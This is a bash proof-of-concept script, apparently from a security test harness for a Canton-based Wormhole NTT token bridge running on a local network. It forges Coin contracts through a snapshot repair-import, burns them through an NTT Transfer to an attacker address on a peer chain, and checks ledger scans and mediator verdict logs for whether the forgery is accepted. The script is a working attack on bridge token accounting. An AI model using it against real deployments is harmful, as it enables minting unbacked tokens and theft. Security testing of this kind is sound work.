#!/usr/bin/env bash
# Snapshot forgery proof of concept (L5): a guardianGovernance host gives a new host a snapshot with an invented Coin.
# Usage:
#   snapshot_forgery_poc.sh seed-source <forged-acs-file>         Repair-import the invented Coins on app-provider.
#   snapshot_forgery_poc.sh purge <participant> <contract-id,...>  Repair-purge contracts on one participant.
#   snapshot_forgery_poc.sh attack <coin-contract-id> <label> <expected-outcome> [<owner-party> <participant> <raw-amount>]
#       The owner (default: the attacker on app-provider) burns the Coin with NTT Transfer. <expected-outcome> is committed,
#       rejected or any. The baseline burns a real Coin with the same command.
#       Prints the completion, the PublishMessage scan of sv, app-provider and guardian4, and the verdict log lines.
# The attacker party and the forged Coins come from console/forge_coin_contract.canton ($LOCALNET_STATE_DIR/guardian4).
set -euo pipefail
# shellcheck source=ntt_lib.sh
source "$(dirname "${BASH_SOURCE[0]}")/ntt_lib.sh"

readonly GUARDIAN4_JSON_API_URL="http://localhost:5975"
readonly PUBLISH_MESSAGE_SCAN="$REPO_ROOT/canton/tools/publish_message_scan.sh"
readonly FORGERY_STATE="$LOCALNET_STATE_DIR/guardian4/forgery.json"
readonly PEER_CHAIN_ID=2
readonly ATTACKER_RECIPIENT_ADDRESS="000000000000000000000000a77ac4e7a77ac4e7a77ac4e7a77ac4e7a77ac4e7"
# 1,000,000 tokens at 8 decimals.
readonly FORGED_RAW_AMOUNT=100000000000000
readonly VERDICT_LOG_PATTERN='LOCAL_VERDICT|InactiveContracts|LocalReject|MEDIATOR_|Verdict|verdict|unknown contract|Unknown contract|ACS_COMMITMENT|CommitmentMismatch|mismatch'

console_with_guardian4() {
  LEDGER_API_TOKEN="$(cat "$gg_work_dir/script.jwt")" \
  CANTON_CONSOLE_CONFIG="$LOCALNET_SCRIPT_DIR/console/remote-participants-guardian4.conf" \
    "$LOCALNET_SCRIPT_DIR/canton_console.sh" "$@"
}

json_api_url_of() {
  if [[ "$1" == guardian4 ]]; then echo "$GUARDIAN4_JSON_API_URL"; else json_api_url "$1"; fi
}

ledger_end_of() {
  curl_bounded -sSf "$(json_api_url_of "$1")/v2/state/ledger-end" -H "@$SCRIPT_AUTH_HEADER" | jq -er .offset
}

# gg_contract_with_blob <template-suffix> <jq-filter>: one gg contract on app-provider as a disclosed contract.
gg_contract_with_blob() {
  active_contracts_with_blobs app-provider "$GG_PARTY" "$1" \
    | jq -ec "[.[] | select($2)] | if length == 1 then .[0] | {templateId, contractId, createdEventBlob, synchronizerId}
        else error(\"expected one $1, found \(length)\") end"
}

repair_on() {
  local repair_output
  repair_output="$(REPAIR_PARTICIPANT="$1" REPAIR_ACTION="$2" REPAIR_FILE="${3:-}" REPAIR_CONTRACT_IDS="${4:-}" \
    console_with_guardian4 "$LOCALNET_SCRIPT_DIR/console/repair_contracts.canton" 2>&1)" || true
  grep -E '^REPAIR|ERROR' <<<"$repair_output" | head -n 20 || true
  grep -qE "^REPAIR $1 $2=accepted reconnected=true" <<<"$repair_output"
}

attack_with_coin() {
  local coin_cid="$1" attack_label="$2" expected_outcome="$3" attacker_party="${4:-}" submitting_participant="${5:-app-provider}"
  local raw_amount="${6:-$FORGED_RAW_AMOUNT}" manager_cid emitter_cid
  local core_state_cid coin_factory_cid started_at response http_status participant_name scan_output manager_disclosure
  local -A begin_offsets
  [[ -n "$attacker_party" ]] || attacker_party="$(jq -er .attackerParty "$FORGERY_STATE")"
  manager_cid="$(jq -er .burnMint.managerCid "$NTT_CONTRACTS")"
  emitter_cid="$(gg_contract_with_blob :Wormhole.Core.State:Emitter \
    ".createArgument.emitterId == \"$(jq -er .burnMint.emitterId "$NTT_CONTRACTS")\"" | jq -er .contractId)"
  core_state_cid="$(gg_contract_with_blob :Wormhole.Core.State:CoreState true | jq -er .contractId)"
  coin_factory_cid="$(jq -er .coinFactory "$NTT_CONTRACTS")"
  manager_disclosure="$(gg_contract_with_blob :Wormhole.Ntt.Manager:NttManager ".contractId == \"$manager_cid\"")"
  for participant_name in sv app-provider guardian4; do
    begin_offsets[$participant_name]="$(ledger_end_of "$participant_name")"
  done
  echo "ATTACK $attack_label coin=$coin_cid attacker=$attacker_party begin offsets: sv=${begin_offsets[sv]} app-provider=${begin_offsets[app-provider]} guardian4=${begin_offsets[guardian4]}"
  started_at="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  response="$(submit_local_response "$submitting_participant" "snapshot-forgery-$attack_label-$(date +%s)" "$(jq -nc --arg party "$attacker_party" '[$party]')" \
    "$(exercise_command "$(jq -er .templateId <<<"$manager_disclosure")" "$manager_cid" Transfer "$(jq -n --arg user "$attacker_party" \
      --arg emitter "$emitter_cid" --arg coreState "$core_state_cid" --arg chain "$PEER_CHAIN_ID" \
      --arg recipient "$ATTACKER_RECIPIENT_ADDRESS" --arg rawAmount "$raw_amount" --arg coin "$coin_cid" \
      --argjson extraArgs "$EMPTY_EXTRA_ARGS" '{
        user: $user, transceiverEmitterCid: $emitter, coreStateCid: $coreState, ledgerCid: null,
        recipientChain: $chain, recipientAddress: $recipient, rawAmount: $rawAmount, nonce: "4242", consistencyLevel: "0",
        inputHoldingCids: [$coin], feeAllocation: null, extraArgs: $extraArgs}')")" \
    "$(json_array \
      "$manager_disclosure" \
      "$(gg_contract_with_blob :Wormhole.Core.State:Emitter ".contractId == \"$emitter_cid\"")" \
      "$(gg_contract_with_blob :Wormhole.Core.State:CoreState ".contractId == \"$core_state_cid\"")" \
      "$(gg_contract_with_blob :Token.CIP0056.CoinFactory:CoinFactory ".contractId == \"$coin_factory_cid\"")")")" || true
  http_status="$(tail -n 1 <<<"$response")"
  echo "ATTACK $attack_label submission HTTP $http_status"
  sed '$d' <<<"$response" | jq -c 'if .transaction then {updateId: .transaction.updateId, offset: .transaction.offset,
      events: [.transaction.events[] | to_entries[0] | {kind: .key, template: (.value.templateId | split(":") | .[1:] | join(":")), choice: (.value.choice // null)}]}
    else {code: .code, cause: (.cause // .message // . | tostring | .[0:600])} end' 2>/dev/null || sed '$d' <<<"$response" | head -c 1500
  echo
  sleep 5
  for participant_name in sv app-provider guardian4; do
    scan_output="$("$PUBLISH_MESSAGE_SCAN" "$(json_api_url_of "$participant_name")" "$gg_work_dir/script.jwt" "$GG_PARTY" \
      "${begin_offsets[$participant_name]}" 2>&1)" || true
    echo "ATTACK $attack_label PublishMessage scan as guardianGovernance on $participant_name: ${scan_output:-none}"
  done
  echo "ATTACK $attack_label verdict log lines (canton container: sv, app-provider, app-user, mediator):"
  docker logs canton --since "$started_at" 2>&1 | grep -E "$VERDICT_LOG_PATTERN" \
    | jq -rR 'fromjson? // {message: .} | "  [\(.logger_name // "" | split(".") | last)] \(.message | .[0:400])"' | head -n 40 || true
  echo "ATTACK $attack_label verdict log lines (guardian4):"
  docker logs guardian4 --since "$started_at" 2>&1 | grep -E "$VERDICT_LOG_PATTERN" | cut -c1-500 | head -n 20 || true
  case "$expected_outcome" in
    committed) [[ "$http_status" == 200 ]] || fail "$attack_label: expected the transaction to commit, HTTP $http_status" ;;
    rejected) [[ "$http_status" != 200 ]] || fail "$attack_label: expected a rejection, the transaction committed" ;;
    any) ;;
    *) fail "unknown expected outcome $expected_outcome" ;;
  esac
  echo "PASS: $attack_label outcome matches '$expected_outcome' (HTTP $http_status)"
}

case "${1:-}" in
  seed-source) repair_on app-provider import "${2:?forged ACS file}" || fail "repair import on app-provider failed" ;;
  purge) repair_on "${2:?participant}" purge "" "${3:?contract ids}" || fail "repair purge on $2 failed" ;;
  attack) attack_with_coin "${2:?coin contract id}" "${3:?label}" "${4:?expected outcome}" "${5:-}" "${6:-app-provider}" "${7:-$FORGED_RAW_AMOUNT}" ;;
  *) echo "usage: snapshot_forgery_poc.sh <seed-source|purge|attack> ..." >&2; exit 2 ;;
esac
